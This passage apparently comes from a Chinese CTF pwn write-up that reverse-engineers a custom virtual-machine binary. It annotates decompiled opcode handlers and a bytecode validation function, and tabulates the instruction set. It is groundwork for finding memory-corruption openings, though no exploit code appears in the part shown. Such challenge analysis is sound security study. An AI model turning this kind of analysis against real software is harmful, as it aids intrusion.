operator">!</span>v2 <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果code第一字节为0</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>  <span class="token punctuation">{</span>    v28 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取code第三字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v28 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将*(_QWORD *)(8LL * v28 + a1)中的值与(v30 + 3)中的值相加</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移，1+1+1+8=11</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>  <span class="token punctuation">{</span>    v27 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v27 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将两个寄存器中的值相加，放入v27指定的寄存器中</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC指针后移</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//add功能标志位为0，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相加</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第一字节为1</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1</span>  <span class="token punctuation">{</span>    v26 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v26 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token function">take_value_QWORD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将以第二字节指定的寄存器中的值与code中的后八字节相减</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token comment" spellcheck="true">//如果第二字节不为1</span>  <span class="token punctuation">{</span>    v25 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取第三字节</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> v25 <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v30 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将两个寄存器中的值相加，放入v27指定的寄存器中</span>    v30 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC指针后移</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//sub功能标志位为1，通过第二字节是否为1，可以指定寄存器中的值与code中的数值相加，或者两个寄存器中的值进行相减</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></code></pre><p>就分析这几个指令吧，其他的和这几个的结构都差不多的，以第一字节作为标志位，标志执行什么功能，第二字节作为是寄存器之间进行操作还是寄存器与数值进行操作的标志位，第三字节指定第一个寄存器，当第二字节为1时，第四部分为一个八字节的数字，否则为一个一字节的数值，指定第二个寄存器。总结所有code如下：</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"add"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"sub"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"mul"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"div"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"mov"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"jsr"</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token string">"and"</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">"xor"</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"or"</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"not"</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">"push"</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">"pop"</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">"jmp"</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token string">"alloc"</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">"nop"</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">}</span></code></pre><p>现在我们再回过头来看check函数，check函数接收一个参数，为vm结构体。check函数短一些，所以全部分析一遍吧</p><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">check</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+19h] [rbp-27h]</span>  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Dh] [rbp-23h]</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Eh] [rbp-22h]</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int8 v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+21h] [rbp-1Fh]</span>  <span class="token keyword">unsigned</span> __int8 v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+22h] [rbp-1Eh]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-1Ch]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-14h]</span>  <span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span>v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v13 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PC</span>  v11 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v11 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token operator">++</span>v10<span class="token punctuation">;</span>    v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//取标志位</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//标志位为9，对应not</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二个字节的值大于7，寄存器范围报错，因此只有八个寄存器</span>        <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*not    else if ( v2 == 9 )    {      v9 = take_value(v30 + 1);      *(_QWORD *)(8LL * v9 + a1) = ~*(_QWORD *)(8LL * v9 + a1);      v30 += 2;    }not只有两个字节，将通过第二个字节找到的寄存器的值取反    */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xC</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为12，对应jmp</span>      <span class="token punctuation">{</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无操作，PC指针后移两个字节</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*jmp      else if ( v2 > 11 )      {          ..........          else if ( v2 &lt; 13 )        {          v30 += (unsigned __int8)take_value(v30 + 1) + 2;//PC指针往后移动take_value(v30 + 1) + 2        }      }      */</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xC</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xE</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为14，对应nop</span>        <span class="token punctuation">{</span>          <span class="token operator">++</span>v13<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//无操作，PC指针后移两个字节</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0xE</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位13，对应alloc</span>        <span class="token punctuation">{</span>          v12 <span class="token operator">=</span> <span class="token function">sub_D13</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v12 <span class="token operator">&lt;=</span> <span class="token number">0xFF</span> <span class="token operator">||</span> v12 <span class="token operator">></span> <span class="token number">0x1000</span> <span class="token punctuation">)</span>            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid size!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//限制重新分配的栈空间大小</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x5C</span><span class="token punctuation">)</span> <span class="token operator">=</span> v12 <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">0x58</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/*alloc        if ( v2 == 13 )        {          v29 = sub_D13((unsigned int *)(v30 + 1));//取第二字节          free((void *)(*(_QWORD *)(a1 + 0x48) - 8LL * *(unsigned int *)(a1 + 0x5C)));//将原来的栈空间free掉          (//vm结构体          *(_QWORD *)(a1 + 0x40) = malloc(a2);            *(_QWORD *)(a1 + 0x48) = *(_QWORD *)(a1 + 0x40) + 8LL * (a2 >> 3);            *(_QWORD *)(a1 + 0x40) = *(_QWORD *)(a1 + 0x48);            *(_DWORD *)(a1 + 0x5C) = a2 >> 3;            )          set_stack(a1, v29);//重新设定大小为v29的栈空间          v30 += 5;//PC指针后移        }        */</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">255</span> <span class="token punctuation">)</span>LABEL_67<span class="token punctuation">:</span>            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">0xA</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//标志位为10，对应push</span>      <span class="token punctuation">{</span>        v4 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> v4 <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节不为1且不为0</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">92</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果栈数值大于最大数据量</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节为1</span>        <span class="token punctuation">{</span>          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>        <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">/*push      else if ( v2 > 9 )      {        if ( (unsigned __int8)take_value(v30 + 1) == 1 ) //如果第二字节为1        {          v31 = take_value_QWORD((__int64)(v30 + 2)); //取第三部分，一个八字节数          *(_QWORD *)(a1 + 0x40) -= 8LL;//栈顶降低八字节          **(_QWORD **)(a1 + 0x40) = v31;//将这个八字节数压入栈中          v30 += 10;//PC指针后移，1+1+8=10        }        else//如果第二字节不为1        {          v8 = take_value(v30 + 2);取第三字节          *(_QWORD *)(a1 + 0x40) -= 8LL;栈顶降低八字节          **(_QWORD **)(a1 + 0x40) = *(_QWORD *)(a1 + 8LL * v8);//将通过v8指定的寄存器的值压入栈中          v30 += 3;        }        ++*(_DWORD *)(a1 + 58);//栈的数据数量加一      }      */</span>        <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果第二字节不为1</span>        <span class="token punctuation">{</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第三字节大于7</span>            <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果标志位为11，对应pop</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果栈为空</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//PC指针后移</span>        <span class="token operator">--</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//栈数据减一</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果标志位为4，对应mov</span>    <span class="token punctuation">{</span>      v2 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第二字节</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token operator">||</span> v2 <span class="token operator">&amp;</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//如果第二字节为1或4</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果寄存器超范围</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span><span class="token comment" spellcheck="true">//如果第二字节不为1或4</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>v2 <span class="token operator">&amp;</span> <span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果第二字节也不为8或0x10或0x20</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid code!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第三字节</span>        v6 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取第四字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">7u</span> <span class="token operator">||</span> v6 <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果寄存器超范围</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/*mov      else      {        v3 = take_value(v30 + 1);//取第二个字节        if ( v3 &amp; 1 ) //第二字节为1        {          v4 = (__int64 *)(8LL * (unsigned __int8)take_value(v30 + 2) + a1);取第三字节指定的寄存器的值          *v4 = take_value_QWORD((__int64)(v30 + 3));//将寄存器中的值指向的地址赋值为一个八字节数          v30 += 11;//PC指针后移        }        else if ( v3 &amp; 4 )//第二字节为4        {          v20 = take_value(v30 + 2);//取第三字节          v33 = take_value_QWORD((__int64)(v30 + 3));//取八字节数          *(_QWORD *)(8LL * v20 + a1) = take_value_QWORD(v33);//将一个寄存器赋值为这个数          v30 += 11;        }        else if ( v3 &amp; 8 )//第二字节为8        {          v19 = take_value(v30 + 2);//取第三字节          *(_QWORD *)(8LL * v19 + a1) = *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将一个寄存器中的值赋给另一个寄存器          v30 += 4;        }        else if ( v3 &amp; 0x10 )//第二字节为0x10        {          v17 = take_value(v30 + 2);//取第三字节          v18 = take_value(v30 + 3);//取第四字节          v32 = take_value_QWORD(*(_QWORD *)(8LL * v18 + a1));//取v18指定的寄存器的值          *(_QWORD *)(8LL * v17 + a1) = take_value_QWORD(v32);//将v32指向的地址中的值赋给v17指定的寄存器          v30 += 4;        }        else        {          if ( !(v3 &amp; 0x20) )//第二字节为0x20            sub_CAA("Invalid code!");          v16 = take_value(v30 + 2);取第三字节          **(_QWORD **)(8LL * v16 + a1) = *(_QWORD *)(8LL * (unsigned __int8)take_value(v30 + 3) + a1);//将第三字节指向的寄存器中的值赋给v16指定的寄存器的值指向的地址          v30 += 4;        }      }    */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token comment" spellcheck="true">//剩下的就不说了</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">!=</span> <span class="token number">5</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_18<span class="token punctuation">;</span>      v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>        <span class="token keyword">goto</span> LABEL_67<span class="token punctuation">;</span>LABEL_18<span class="token punctuation">:</span>      v7 <span class="token operator">=</span> <span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">7u</span> <span class="token punctuation">)</span>          <span class="token function">sub_CAA</span><span class="token punctuation">(</span><span class="token string">"Invalid register!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v13 <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token 